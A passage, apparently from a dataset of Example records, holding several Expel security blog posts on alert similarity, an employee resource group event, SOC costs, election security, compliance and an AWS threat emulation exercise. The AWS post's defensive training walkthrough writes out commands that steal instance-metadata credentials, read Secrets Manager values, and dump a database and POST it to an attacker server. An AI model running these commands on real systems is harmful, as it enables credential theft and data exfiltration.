was helps the analyst make the right decision for Alices incident. This is a simple example, but heres where it gets really interesting: Imagine youre a security provider employing a distributed team of analysts who monitor many different environments, nearly a hundred different security technologies, and respond to many different kinds of activity. The pattern recognition that analysts are innately good at starts to break down with constant context switching  you can only expect a person to commit and recall so much information. By teaching our bots to recognize and surface similar alerts and their associated outcomes, we can let our analysts focus on what they do best: judgment and relationships. The result? We can improve quality and scale at the same time. This is how our Alert Similarity experiment was born. What is Alert Similarity, anyway? In short, Alert Similarity is a feature of Expel Workbench that helps us make high quality decisions at scale. We accomplish this by applying document similarity techniques to the security alerts we process  think of this as teaching our bots to recognize patterns and similarities between alerts. As a result, Ruxie can helpfully surface relevant historical context during alert triage, including a recommended action based on the decisions weve made for similar activity in the past. Fast forward to today: What started as an experiment quickly turned into a unique and valuable Expel Workbench feature. How Alert Similarity benefits our analysts There are three specific ways that Alert Similarity benefits our team of analysts: #1: Instant suggestions based on past similar alerts One of the biggest benefits of Alert Similarity is that our analysts now receive dynamic suggestions in near-real time about new alerts based on similar alerts that our team has seen previously. Not only does this give our analysts more context when evaluating the right next step to take in an investigation, but it also gives us the benefit of personalizing our response to a specific type of alert in a customers environment. For example, a customer might want PUP / PUA alerts categorized as policy violations instead of unwanted software. Our system then automatically learns to treat future, similar alerts as policy violations, automatically suggesting this to the analysts who manage that particular customer environment. #2: Enhanced quality control We pride ourselves on being at the forefront of quality control in security operations . This is incredibly important because, as we add new products and offerings, we want our analysts to learn from their mistakes as we scale our business. With Alert Similarity, we can look for clusters of similar alerts and identify when they result in different outcomes. We then push them into our quality control review process, where we review the alerts with a second set of eyes to determine if the correct actions were taken and whether there are any process improvements to be made. #3: New and improved detections With Alert Similarity, we now have a way to compare data we collect from customer environments against historical alerts that we know turned out to be true positive incidents. This capability helps with detection research and engineering. For example, if we compare a new event (or even an event from the past that wasnt deemed alert-worthy originally) to our known true positives, it can give us the insight we need to determine if we should write additional detections for customer environments. How its going Our Alert Similarity feature launched in February 2022. The feedback weve heard from our security operations center (SOC) about it so far is positive and early metrics show that the feature is working the way wed hoped  its offering our analysts valuable suggestions about new alerts in the moment theyre being reviewed, and its saving our team time as they make decisions about the right next steps in an investigation. Take a look at our first read-out: Were also sharing some of these same metrics with our executive leadership team and board. Interested in creating your own version of Alert Similarity? In just a few months, our analysts  and in turn, our customers  are already benefiting from the introduction of Alert Similarity. That doesnt mean were done. In fact, were continuing to work on ways of improving the feature and using similar techniques to drive other features and use cases. Want to learn more about exactly how we built and tested Alert Similarity, and get some tips on how you might be able to develop something similar to benefit your own SOC? Youre in luck  we created a technical walk-through.'}) (input_keys={'title'}),
  Example({'title': "How Expel's BOLD ERG celebrated Black contributions to ...", 'url': 'https://expel.com/blog/how-expels-bold-erg-celebrated-black-contributions-to-music-for-black-history-month/', 'date': 'Mar 8, 2023', 'contents': 'Subscribe  EXPEL BLOG How Expels BOLD ERG celebrated Black contributions to music for Black History Month Expel insider  2 MIN READ  NEIKO LAMPKIN  MAR 8, 2023  TAGS: Careers / Company news The cybersecurity industry has an unfortunate reputation for lacking diversity. But we at Expel are out to change that, because we know were better when different. We like to say that were a stronger organization when we recognize, celebrate and learn from those whose backgrounds and perspectives are different from our own. To support that focus on diversity, Expel has a number of employee resource groups (ERGs) that nurture and bolster various communities of Expletives and their allies. These include WE (Women of Expel), The Treehouse (LGBTQ+ Expletives), The Connection (a community of Expletives focused on mental wellbeing), and BOLD (Black Opportunities for Learning and Development). Our BOLD ERG was excited to honor Black History Month in a particularly BOLD fashion (see what we did there?). Heading into February, we thought about the many things that bring the Black community together and showcase its beauty, which helped us identify the perfect vessel for education: music. From there, we determined our Black History Month 2023 theme would be An Introduction to Black Art through Music. Throughout February, our BOLD community shared weekly Slack posts that educated our people on the impact of Black music throughout the world. These posts explored genres such as ragtime, blues, gospel, jazz, R&amp;B, hip-hop, and reggaeton. These posts also painted a timeline that acknowledged music as one of the few possessions slaves brought with them to the Americas. But the celebration didnt stop there. To further connect to our theme, we brought the education to life by hosting a live performance at Expels interdimensional HQ by genre-bending Washington, D.C.-based duo April + VISTA . The performance was filled with lush, multidimensional sounds as the duo guided us through ancestral reflections through song. The performance was accompanied with a lunch from Makers Union Pub for the People and sound equipment was provided by Zoney Sound both Black-owned businessesenabling us to lean into an all-around celebration of Blackness. Still stunned by April + VISTAs performance, our journey then took us to the heart of Miami for our first-ever company kickoff (CKO), which brought together more than 400 Expletives to meet, learn, and plan for the year ahead. Miami is known for its warm weather, great food, beautiful beaches, and most importantly its rich and vibrant culture. We knew Miami would provide a great backdrop to further explore Black impact and influence. To emphasize this, we brought in Miami-based, Ghana-born artist Nii Tei to DJ our welcome reception. Niis set seamlessly blended house-, electronic, and disco-inspired sounds with African influences, creating a soundscape that reflected Black creativity and expression. Having most Expletives in one place for CKO also presented an ideal opportunity for additional education about Black history in Miami, so our BOLD community collaborated to create an exhibit that highlighted the Black historical context of the city. The exhibit acknowledged the Black impact on places like Overtown (formerly known as Colored Town), as well as Little Havanaa place many Cuban Americans call home and has now expanded to include a large population of people from other parts of the Caribbean and Central America. We recognized iconic places like Little Haiti that boast rich FrenchCreole culture and also highlighted how important the Jewish communitys alliance with Black racial equality activists in the late 1950s supported desegregation efforts. Wowwhat a month! And to add on to our celebration of Black impact, our Women of Expel (WE) and Treehouse ERGs shared their support by highlighting the intersectionality among our communities recognizing Black women and LGBTQ+ trail blazers such as Bell Hooks, Alice Ball, Marsha P. Johnson, and Gladys Bentley. As we carry the celebratory spirit into Womens History Month, were excited for continued programming and educational opportunities. We encourage you to check out our equity, inclusion, and diversity (EID) page to learn more about our ERGs and our approach to EID.'}) (input_keys={'title'}),
  Example({'title': 'How much does it cost to build a 24x7 SOC?', 'url': 'https://expel.com/blog/how-much-does-it-cost-to-build-a-24x7-soc/', 'date': 'Feb 28, 2018', 'contents': 'Subscribe  EXPEL BLOG How much does it cost to build a 247 SOC? Security operations  8 MIN READ  YANEK KORFF  FEB 28, 2018  TAGS: How to / Planning / SOC The phone rings. Its your boss. How much is it going to cost us to take our SOC to 247?! It sounds urgent. It turns out hes calling because he just saw someone tweet about a data breach at one of your competitors. Youre tempted to throw out a million dollars as an estimate. It seems as good a place to start as anywhere. But is it? After all, the costs of building and operating a 247 security operations function can vary greatly. One of the biggest factors impacting cost is how good you want to be. Do you need an excellent security operations center (SOC)? Or just one thats good enough? Or maybe something in-between? Turns out theres a floor cost that youre unlikely to go under if youre shooting for competent. Beyond that, the skys the limit. Lets take a look at how we get to a right-sized answer that fits your particular situation. Night of the roundtable: adjectives matter when you build a SOC Its tempting to whip out the calculator and start adding up the dollars, but not all SOCs are built alike. Are you building something basic? Advanced? What do these adjectives even mean? A few years ago, our CEO was hosting a roundtable dinner with a room full of fellow CEOs. The topic was cybersecurity operations and the CEOs felt strongly that they needed to up their game. What they were doing just wasnt good enough. It was time to push the pendulum to state of the art. What exactly does that look like, and whats the price tag? Lets look at the spectrum of what a SOC might do. Security Operations Center (SOC) Capabilities Whew. Thats quite a lot of capability and it begins to represent what a state-of-the-art SOC entails. Add all of that up and depending on how big your organization is, a SOC could cost anywhere from a few million dollars to half a billion 1 (or heck, even unlimited 2 ). Now, back to that CEO roundtable. After the whole state-of-the-art discussion, one of the CEOs in the back of the room raised her hand, Considering were not a big bank, whats good enough and how much does that cost? The SOC cost breakdown consists of several elements. Frankly, the foundational investments for good enough arent any different than state-of-the-art. Youll need people. While there are seemingly endless shift schedules to choose from, our experience in building 247 security teams tells us that the minimum number of people youll want operating in a SOC is 12. You could probably get by with eight, but vacations and illness will result in individuals being stranded alone on shift. Considering even entry-level security analysts command $75,000/year in salary alone, your cost to operate a SOC starts at roughly a million dollars. Beyond people, the next largest impact on your SOCs efficacy will be your technology and how easy you can make it for your people to use. Any SOC that doesnt have the right technology to provide visibility, detection, and investigative capabilities will end up being pretty useless, regardless of how many people you throw at it. While the technology bill at smaller organizations will only be a fraction of the staffing costs, as an organization grows, those tech costs can really skyrocket. Now that we have a sense of our base costs, lets imagine four possible security operations centers. These examples map relatively well to examples weve seen in the fieldboth at customers and at service providers. 1. The basic SOC This SOC focuses primarily on detection (but not so much on investigation). Theyve invested sparingly in technology and have an odd assortment of visibility, partially due to investments the last CISO made and partially due to the current limited budget. Analysts work primarily in a SIEM that was deployed several years ago and it just hasnt been kept up to date. Overall, these technologies offer decent detection capability but theres not much flexibility to tune how they work with additional intelligence or use them for more advanced investigative use cases. Spending time doing investigations or engaging in hunting isnt really in the cards at all. There hasnt been a major incident, but the current CISO worries: if there were, would his SOC find it? 2. The intermediate SOC At this level, the SOC has mastered detection and the technology investments provide reasonably good visibility into the organizations nooks and crannies. Beyond the basic detection capability of a SIEM fed by event logs, the SOC has deployed a combination of EDR and network forensics technologies that provide advanced threat detection. Security analysts operate at multiple tiers; some of the more senior practitioners frequently leave the SIEM to take advantage of unique capabilities their advanced tech offers. The team really wants to spend more time being proactive, but operational reality makes that difficult. SOC management oscillates on a day-by-day basis: some days theyre confident about the capabilities of their SOC, and other days they feel blind and they worry theres stuff on the network they dont know about. 3. The advanced SOC SOCs that get to this level have made a tremendous investment in tooling to free up their analysts time. Tier one and two analysts are working primarily in a SIEM. But thats only because theyve taken the time (along with a good dose of help from outsiders) to tune their correlation rules and plug some of their more specialized products into the SIEM. They can even pull data from their network and endpoint security products without leaving the SIEM. This improves the quality (and speed) of their investigations. When they escalate incidents, tier three analysts pick them up and pivot directly to more sophisticated analysis tools and consoles. While good things come in threes, advanced SOCs often add a fourth cadre of analysts called the hunt team. Theyre not part of the 247 rotation. They focus exclusively on finding things their tech missed. While they do a little work in the SIEM, they spend most of their time building and running custom scripts to find threats their security products arent alerting on. Lastly, there are a couple of groups helping to make all of the underlying tech runs. Intelligence analysts make sure that the intel feeding the technology is up to date, ensure its not burying shift analysts in useless alerts, andwhen serious threats ariseadd color and context so that management understands the risks theyre facing. Finally, youll see engineers whose job is to build software that makes their security products talk to each other. This helps streamline their processes and automate data gathering as best as they can. For lack of a better term at this organization, they call themselves SOC plumbers. The CISO in the advanced SOC is comfortable with her security operation and periodically brings in third parties to run red team exercises to ensure the SOC is performing as shed expect. 4. The learning SOC Like the advanced SOC, this organization has invested an enormous amount of time and money in automation and analytics. Theyre focused on ensuring that humans are doing the security work that only humans can do. Everything else is handled by software. To that end, theyve tied their security technologies together with an orchestration framework and pulled in resources from IT to help automate investigation and remediation. As a metrics-driven organization, they watch closely what the ratios are between false positives and true positives, how long it takes to triage and investigate, and how much value theyre getting out of their security investments based on usage. These metrics drive a constant stream of change back into the infrastructure because the tuning is never done. A note of caution here: just because you have metrics doesnt mean youre operating at this level. Theyre a necessary but not sufficient condition. Every time the CISO brings in a red team (he rotates between three vendors) he reviews the metrics to ensure time-to-detect, time-to-respond and the overall accuracy thats coming out of his SOC is improving. Theres still no guarantee his organizations secure, but he feels prepared to respond should anyone get in. Picking the SOC thats right for you What SOC is right for you? Perhaps its one of the examples above. Or, maybe its something in between. Only you can determine whats right for your organization, but Expel might be able to assist you in choosing whats right for your organization. Weve found that the best way to figure out how much security you need to put in place is by looking at things through the lens of risk, specifically through a framework. It probably doesnt matter which one, but starting with the end in mind is better than going YOLO . I know. It sounds kinda boring. It would be a lot more fun to go buy and implement a bunch of whizz-bang security tech. We see this a lot. But we also see these organizations paying a price in the end. A few years down the road their whizz-bang security tools are gathering dust and their people are overwhelmed with useless alerts. If youre willing to take this more step-by-step approach, we recommend NISTs Cybersecurity Framework . Its not the only one you can use, but it breaks down security practices into five simple functions: identify, protect, detect, respond, and recover. It also encompasses a whole lot more than what goes into a SOC, which makes it even more useful. That said, if youre focused on SOC operations, youll find your best guidance within detect and respond with a few relevant nuggets in identify . Well be providing a lot more guidance about this framework on the EXE blog soon, but for now, the important thing to know is that your level of rigor and sophistication doesnt need to be at level 4 across the board. Its more like building out your D&amp;D character. Youre essentially allocating a limited set of points across charisma, agility, and strength. Adding it all up After youve determined the kind of risks you want to manage and mitigate, youll have a better notion of the kind of SOC you need to build. Below, weve outlined a rough estimate for purchasing SOC technology and staffing the team. Because technology 3 costs can vary significantly based on the size of the organization, were imagining an organization with about 5,000 employees. Bear in mind that at larger organizations, the costs of technology can increase dramatically. Sample costs for SOC-related tools, staffing, and implementation Based on an organization of 5,000 employees Thats a wrap Understanding the true costs of building and operating a SOC has more to do with the capability youd like to field than the people you need to hire to run 247. Hopefully, this post has helped you estimate a little better what kind of SOC youd like to build and how much that might cost. And look, if youre sitting here thinking oh man, this isnt the kind of money I want to be spending. Securitys not a core part of my business, and theres no way were going to become experts at it, well, a great many people end up at that same conclusion. In that case, it might be worth considering outsourcing your security operations center and going with SOC as-a-service model . Ill leave you with a parting thought. If you do decide that building your own SOC capability is a bridge too far, consider when youre outsourcing what exactly your SOC provider is bringing to the table. Is it basic or advanced? Just the hunting use case? There are infinite ways in which these capabilities can be carved up, and the better you understand what capabilities you need, the better equipped youll be to build them or buy them. 1: Forbes Why J.P. Morgan Chase &amp; Co. Is Spending A Half Billion Dollars On Cybersecurity, 30 Jan 2016 https://www.forbes.com/sites/stevemorgan/2016/01/30/why-j-p-morgan-chase-co-is-spending-a-half-billion-dollars-on-cybersecurity/?sh=3c58f0f02599 2: Forbes Bank of Americas Unlimited Cybersecurity Budget Sums Up Spending Plans In A War Against Hackers, 27 Jan 2016 https://www.forbes.com/sites/stevemorgan/2016/01/27/bank-of-americas-unlimited-cybersecurity-budget-sums-up-spending-plans-in-a-war-against-hackers/?sh=6ab120a264cd 3: Were focusing on SOC-specific tools, not the bread-and-butter security investments organizations make for things like basic firewalls, identity and access management, patch management, vulnerability management, and the like.'}) (input_keys={'title'}),
  Example({'title': 'How public-private partnerships can support election security', 'url': 'https://expel.com/blog/how-public-private-partnerships-can-support-election-security/', 'date': 'Mar 14, 2019', 'contents': 'Subscribe  EXPEL BLOG How public-private partnerships can support election security Tips  4 MIN READ  BRUCE POTTER  MAR 14, 2019  TAGS: Cloud security / Managed security / Planning / Vulnerability Bruce Potter is our CISO here at Expel. In his past life, he served as the senior technical advisor to the members of President Obamas Commission on Enhancing National Cyber Security. Its only March but it feels like November 2020 is right around the corner. In case youve been living under a rock, election security is a hot topic leading up to the next national election  every day theres a new headline about how to improve election technology or get rid of it altogether or how to stop threat actors from meddling in U.S. elections . Between security at the ballot box, concerns around central voting databases, issues with third-party data aggregators and information operations on social media, theres a lot to keep tabs on. Many of the potential answers to the What should we do about it? question falls into the public policy realm. Various national, state and local agencies are responsible for addressing some of these issues. The integrity of voter registration databases is largely a state and local government concern. As much as private industry may have opinions on how to properly secure these systems, it is ultimately the job of dedicated civil servants to decide what to protect and how to do it. That begs the question  What can and should the private sector do? And specifically, how and why should private sector security organizations be involved? Cybersecurity companies have an incredible capability to know the nitty gritty details of malware and malicious activities that are happening inside our customers networks and systems every single day. These companies are the ones that are on the front lines when it comes to defending businesses against attacks ranging from commodity malware to highly targeted state actors. While the U.S. government does its part when it comes to protecting our democracy and could do even more, the reality is that many citizens look to the government for help in times of crisis but want the government to be involved in as little as possible on a regular basis. Ive done a fair bit of contract work with the government that had the potential to positively impact the private sector, but there were often hurdles outside each respective agencys control that stalled or complicated each project. First  which is sometimes the case for cybersecurity in general  there are various spheres of authority that get in the way of productive outreach. National Security Agency (NSA) has lots of great ideas but is in general only responsible for the protection of classified systems. Defense Advanced Research Projects Agency (DARPA) and Department of Defense (DoD) have defense in their names, so you know what their focus is. And Department of Homeland Security (DHS) often is focused on critical infrastructure but not on the protecting citizens at large. With no single agency leading the charge on all things cybersecurity, its difficult to find a point person to conduct public outreach. Second, and more the purview of the private sector, is the concern that when the government shows up and says, Were from the government, were here to help, our natural inclination is to be incredibly skeptical. It can be difficult to accept assistance and outreach from a government agency when theres no overt problem to contend with. However, without ongoing involvement that starts long before theres ever a problem, its difficult if not impossible for the government and private sector to collectively be effective when theres an issue. Private industry is an essential part of our national defense when it comes to cybersecurity. The stronger the security of private industry organizations and their service providers is, the better the security of our nation. Weve recognized that in formal policy already through the Clinton-era Critical Infrastructure definitions . Its time we think about how private industry can participate in protecting our democracy through future election cycles. Imagine a public-private partnership  yes, this is an overused phrase and even a dirty word in some circles  between U.S. government entities in the know and cybersecurity companies that have visibility into global networks with the specific purpose of sharing information around election integrity. While there are pockets of sharing outside of critical infrastructure verticals (sometimes through MOUs, other times through a simple handshake), there is no comprehensive program in place to share information about election security with a broad set of private sector partners. What advantage would this type of program have? First off, managed security service providers (MSSPs) and endpoint detection and response (EDR) companies have an incredible view into the global operations of businesses across many industries, and a deep understanding of the security concerns and threats they face each day. If the U.S. government would share the tactics, techniques and procedures of know election threat actors, private sector cybersecurity firms could develop custom detection rules to find these actors within the global networks we have visibility into already. Then, working with our customers, we could quickly share information with the government to inform their operations and help stop attacks against our election systems. Further, this sort of partnership will shed light into the darkness. The more that private sector entities become engaged in this problem, the fewer places the adversaries have to hide. While we know some of what has transpired in social media, little of that has been shared with the public and the data has largely been confined to a few large tech companies. Involving a broad group of cybersecurity organizations in these activities will help demystify malicious activities that target not just U.S. elections but those around the globe. Of course, this type of partnership doesnt come without risk. Cybersecurity companies are often third parties to the data they oversee  the data is actually owned by their customers and cant be shared without explicit permission. In order to be successful, this type of program would have to be well socialized in advance in order to get buy in not just from the cybersecurity companies but from the organizations they support. Which means that if a program like this were to exist, the gears need to be turning now in order to have an impact on 2020 elections. Private sector cybersecurity companies can do far more than just writing blog posts about election security or shaking their collective fists at the cloud. By pulling more private sector partners into the fight against election meddling, the U.S. government can multiply the impact of the knowledge it already has about election threat actors. And by including a broad set of companies  not just a few large companies  we can collectively see into more dark corners and find more malicious activity than would otherwise be possible. Wed also be spreading knowledge of our actions farther and wider, giving a sense of real progress and security to the public at large. At the end of the day, thats exactly what our citizens and our national election systems deserve.'}) (input_keys={'title'}),
  Example({'title': 'How should my MDR provider support my compliance goals?', 'url': 'https://expel.com/blog/how-should-mdr-provider-support-compliance-goals/', 'date': 'Jul 20, 2021', 'contents': 'Subscribe  EXPEL BLOG How should my MDR provider support my compliance goals? Security operations  4 MIN READ  BRUCE POTTER  JUL 20, 2021  TAGS: MDR So someone told you that you need to make sure your tech, privacy and security policies are compliant. And that you need your managed detection and response (MDR) provider to support your compliance program. But what does that mean in practice? There are things you need to do to make sure your tech and data are secure and following security best practices. Youve done those things, and youve checked your work so that if anyone wants to verify youre doing the right things, you can confidently say youve done your due diligence. Thats really whats at the core of any compliance initiative, regardless if its regulatory compliance, industry compliance or just adhering to internal policies. Any good MDR provider should support you in those efforts (well get into how they should specifically do that in a moment). You dont need your security provider to be a compliance liability. What types of compliance impact a security program? Compliance comes in all shapes and sizes. For example, your boss or your board of directors might ask you to make sure your security program is compliant with: Internal company policies Industry regulations Standards frameworks Government regulations Laws and treaties Customer audits For some compliance checks, you may go through an audit. Audits are for compliance frameworks where: Some policy/regulation oversight group has blessed specific audit companies to analyze how well you are complying with the framework; The compliance framework is standardized, so one auditor would likely find the same results as any other auditor; and The audit often results in some sort of certification saying youre compliant (wo0t!)  PCI DSS , ISO 27001 / 27701 and SOC 2 certifications are all pretty common. For other policies and regulations, you may go through a compliance assessment rather than an audit. For these regulations, theres no oversight group that sets out a strict framework to follow, so companies have to take their best guess as to whether or not theyre compliant based on what they know about the policy or regulation requirements. One common example is GDPR  theres no official audit available, so your company may hire a third-party assessor to determine if your tech and policies are in line with the requirements to keep personal data secure. Compliance = things you need to do to keep your data and tech secure + someone verifying youve done those things How Expel supports your compliance goals Lots of our customers here at Expel have various compliance standards they need to follow. Heres a peek at how we support some of the most common compliance frameworks, and how we think any MDR you choose to work with should support you in meeting your compliance goals. SOC2 : Expel is SOC2 Type 2 certified, meaning weve demonstrated that we safely hold and process our customers data. This is a good initial security certification to look for when youre evaluating MDRs. ISO 27001 / 27701 : Expel is also certified for these international cybersecurity and privacy standards, which are even more detailed and process-oriented than SOC2 (read: we care a lot about security!) If you have a complex security situation or strict industry security requirements, these certifications can help indicate that your MDR takes their security equally seriously. GDPR : Theres no official GDPR audit available (yet), but we encourage our customers to work with a third party to perform their own independent GDPR assessment. We did the same here at Expel (feel free to ask us about it). If youre looking to comply with GDPR, your MDR should also meet GDPR-like requirements for handling your data. NIST 800-171 : Like GDPR, theres no official audit available right now for this standard to protect government unclassified information. At Expel, we did an internal self-assessment and are working with a third party for an independent assessment  wed encourage you to do the same. Working with Expel or other MDR can also help you fulfill a number of the standards requirements regarding monitoring, alerting, reporting and responding to incidents. CMMC (Cybersecurity Maturity Model Certification) : This is an upcoming standard thats being included in a number of Department of Defense contracts for detailed, risk-based security. Since CMMC isnt fully rolled out, there arent any auditors (yet)  but you can do what we did and have a third party perform an independent assessment to prepare for the rollout (Questions? Ask us !) PCI DSS : A designated PCI DSS auditor can analyze your compliance with this payment card data security standard. Expel can (and your MDR should) support your compliance by providing real time analysis and response to security alerts. HIPAA : Like for PCI DSS, Expel can support your HIPAA compliance by analyzing and responding to your security alerts in real time. To sum it up, your MDR should be able to support your compliance goals in three ways: They should help you meet the requirements for your desired compliance frameworks so you can get those certifications and meet your security goals (#winning). For example  going after PCI and need to ensure security alerts are being investigated? Have a security operations-related audit finding that you need to fix? Your MDR should be able to help. Your MDR should be able to demonstrate their compliance with various security/privacy standards to keep your data safe as their customer. Your MDR should help you maintain your existing compliance achievements. Youre GDPR compliant? Great! Your MDR should make sure their work wont change that. Compliance may feel overwhelming, but think of your MDR as your compliance partner  holding hands to dive into the pool of NIST frameworks and ISO certifications together. Your MDR can help you make sure youve got the right things in place to keep your tech and data secure, helping you breathe a little easier when its time for your next audit or assessment.'}) (input_keys={'title'}),
  Example({'title': 'How to build a useful (and entertaining) threat emulation ...', 'url': 'https://expel.com/blog/how-to-build-useful-threat-emulation-exercise-aws/', 'date': 'Apr 4, 2019', 'contents': 'Subscribe  EXPEL BLOG How to build a useful (and entertaining) threat emulation exercise for AWS Security operations  7 MIN READ  DAN WHALEN  APR 4, 2019  TAGS: Cloud security / Get technical / How to / Managed security / SOC If you ask the average security analyst how they detect threats in Amazon Web Services (AWS), youll probably get some blank stares, shrugs or a few mumblings about exposed S3 buckets and bitcoin mining. The problem is that many orgs arent fully aware of the risks that exist in their AWS environment, and theyre still learning what theyre responsible for securing versus what AWS monitors. Thats exactly why we love threat emulation exercises and practice them regularly. Simulating realistic attacks in cloud environments help our analysts build muscle memory and prepare them to act quickly and correctly when something bad happens. Getting started Lots of our customers run at least part of their infrastructure in AWS, so weve built quite a few threat emulation exercises that are specific to the AWS environment. They help our analysts sharpen their intuition around AWS services, better understand cloud-based evidence sources and dig into the investigative workflow. Want to create an AWS-focused threat emulation exercise? Here are our tips and tricks for building your own. Step 1: Define the goals and scope Sure, crafting the story for your exercise is the fun part but before putting pen to paper, think about what you (and your team, if youre lucky enough to have one) want to get out of the exercise. What are your goals? Here are the two priorities we had when we ran our first AWS threat emulation exercise: Learn about different kinds of AWS attacks, especially the ones that arent intuitive AWS is a new challenge for security analysts who cut their teeth in traditional enterprise response, so there arent many parallels between AWS attacks and the on-prem ones most security analysts are used to investigating. Thats because there are tons of AWS services  over 100 to be exact  each with their own nuances and security implications. As an industry, were still learning about areas of risk with each AWS service  think misconfiguration of Amazon S3 bucket access policies and credential theft via Amazon EC2 . By building some of these new attack vectors into our threat emulation exercises, we improved our SOCs ability to investigate and respond to these kinds of attacks when they happen in the real world. Get hands-on experience with common AWS services Even if you dedicate time to read through (the admittedly very comprehensive) AWS documentation , its inevitably tough to remember it all (and know how to act on it) in a real-world, high-pressure situation. Getting hands-on experience with AWS services like Amazon EC2, Amazon S3 and Amazon RDS helps you commit this information to memory so youll be more prepared to act quickly when an attack happens. For example, during threat emulation exercises Expel analysts log into compromised EC2 instances and collect forensic information for analysis. Through this process, they get familiar with other sources of evidence from AWS services like Amazon CloudTrail and Amazon GuardDuty. Step 2: Build the thing Building a threat emulation requires more than just standing up infrastructure. Here are the building blocks you can use to create your own exercise: Craft an engaging story During threat emulations, you want your analysts to learn new things, work toward a common goal and have fun while doing all of it. Create a realistic story but add a dash of humor here and there. We created a fictional organization dubbed Widget-Corp, complete with pretend employees, a website and a business model. To make our scenario even more believable, we developed personas for Widget-Corp employees including descriptions of what normal activities for these employees looked like. This gave our analysts the challenge of figuring out what behavior was legitimate and what was suspect during the simulation.Take a look at our Widget-Corp employee profiles and the story we crafted: Employee Profile Mr. Widget Hes the CEO of Widget-Corp. Mr. Widget can be a bit intense at times, but all in all hes a good boss that just wants to lead the booming widget market. His primary concern of late is the activities of Widget-Corps biggest competitor  Best-Widgetz. Donna Reynolds Donna is a back-end engineer responsible for managing compute instances and the master Widget database containing sensitive customer information. Gerald Watson Gerald is a front-end web developer responsible for Widget-Corps website. James Smith James is a Widget developer who builds and commits Widget source code. Norma Cooper Norma is a Sr. Widget developer and is responsible for final Widget code review. Background Widget-Corp has moved to the cloud! After one of the servers in the back office closet caught fire and nearly destroyed a fair amount of Widget source code, the executives finally decided that managing hardware in house didnt make sense. Widget-Corp now runs entirely out of AWS! In fact, their engineers were quite satisfied to discover that there are all kinds of AWS services that make shipping widgets and managing customer data much easier. They were even able to migrate their website https://widget-corp.com to AWS in a matter of hours! Hooray! Widget-Corp CEO, Mr. Widget, has noticed lately that a competitor (Best-Widgetz, Inc) has been releasing widgets to the market right before big Widget-Corp releases. To make matters worse, they seem to be ahead of the curve and are targeting functionality and customers of Widget-Corp! Theyve already lost a few customers  this is not good. Additionally, their front end web developer, Gerald, recently noticed some weird updates to the about section on the website  Mr. Widget is a bit paranoid that something nefarious is going on and has hired Expel to run a surge engagement and identify if there are any signs of compromise in their AWS environment. If Best-Widgetz has managed to get customer data or source code somehow, that would put Widget-Corp at a serious disadvantage! Build believable infrastructure Build your environment based on the goals you set for the exercise. We created a new AWS account that included all the infrastructure we wanted to be part of the simulation. Pro tip: Create an architecture diagram to keep track of all the (literally) moving parts. Heres an example: Generate benign activity Remember those personas we created? Once our infrastructure was up and running, we generated normal activity for each Widget-corp employee. This makes the exercise more realistic because youll have to figure out whats routine (like Donna accessing a secret or James committing source code to an Amazon S3 bucket) versus a red flag. Generating this activity is easy. Just log in and perform the actions youd expect that persona to do in AWS on a regular basis. Choose a plausible attack scenario Think about the risks that exist in your own environment and use them as inspiration for your attack scenario. In our case, we simulated an end-to-end AWS attack starting with compromised credentials for a low-privilege user and ending in complete access to the environment. It may sound kind of extreme but this kind of attack happens more often than youd think  attackers often gain access to something small like an API key committed to a public GitHub repository and end up with the keys to the kingdom. Step 3: Execute the simulated attack Once youve built your AWS environment and your scenario, its time for the real fun to begin. Heres what our simulated attack looked like: Attacker gains initial access via compromised credentials We kicked off our scenario by having our attacker compromise credentials from one of our faux employees, Mr. Smith. Lets pretend he downloaded a file and inadvertently installed malware on his laptop. Our crafty attacker then logged into the Widget-Corp EC2 server with his credentials: Attacker pokes around for interesting data Now that the attacker is on the development server, hes trying to get his hands on any juicy corporate data. Maybe he does some basic discovery like: Seeing what commands poor Mr. Smith ran recently (cat ~/.bash_history)  Searching the file system for interesting files In this case, the attacker sees that Mr. Smith wrote some widget source code and uploaded it to S3. Attacker escalates privileges Now this clever attacker has access to everything James Smith does, but thats not going to be enough to accomplish his mission. One common way attackers escalate privileges in AWS is to dump credentials from the EC2 instance metadata service. Our attacker knows this and tries to get credentials with additional permissions: Nice! By using curl to access the metadata service at 169.254.169.254, the attacker discovered that the widget development instance is assigned an IAM role EC2DeveloperRole and the attacker can retrieve temporary credentials for this role. Using these credentials, he can search for more company data. Now hes looking for the Widget Database server and Widget Web server credentials. Attacker collects web server and database secrets Our attacker stole access keys from the Widget-Corp development server and hes moving on to retrieving secrets stored in the AWS Secret Manager. Listing the available secrets is as easy as: aws --profile widget-dev secretsmanager list-secrets Jackpot! The attacker finds credentials for the Widget Database server and Widget Web server. Heres how he retrieved them: aws --profile widget-dev secretsmanager get-secret-value --secret-id WidgetDatabaseCredentials Attacker performs additional post-compromise activities The attacker isnt done quite yet. Now that he has the keys to the kingdom, he can do all kinds of nefarious things. For the purposes of this exercise, we pretended that he dumped and exfiltrated the contents of the database server and defaced the web server: mysqldump -h widgetcorp-db.us-east-1.rds.amazonaws.com -u dbadmin -p customerdata &gt; dump.sql curl -X POST -d @dump.sql http://&lt;attacker server&gt;:443 Mission complete! Now that your attack scenario is ready to go, its time to unleash the analysts and see if the team can retrace these steps  highlighting detection gaps along the way. Step 4: Build the investigative steps and guidelines Building out the process that analysts will follow for the exercise is just as crucial as building the infrastructure. All of your hard work will be for nothing if the analysts get stuck and frustrated. Weve had luck with using Google Forms to guide our analysts through the threat emulation exercise and prompt them to ask questions along the way. Heres an example of a few of the initial questions we ask our analysts to answer during the exercise: Once you have a draft, have someone else on your team whos experienced give it a read. This will help you identify any ambiguous steps or process gaps  basically areas that need tweaking in your plan  that might trip up your analysts. Step 5: Run the exercise Once youve got your infrastructure up and running and have your simulation ready, press go and have your analysts get to work. Schedule dedicated time for your analysts to run through the scenario, answer questions and hopefully learn a thing or two. As your analysts get to work, dont miss the opportunity for them to practice their communication skills. Weve had success (and a lot of fun) using the personas we create to inject a bit of chaos. For example, weve had Mr. Widget himself call the SOC and request an update on how the investigation is going. This is a great way to get the team used to communicating about investigations in AWS. Whats next? After running a threat emulation, its valuable to talk as a team about what worked well and what we can do better next time. Dont fret if the exercise exposes gaps  thats the point! Document these gaps and see if you can make changes to improve your next exercise.'}) (input_keys={'title'}),
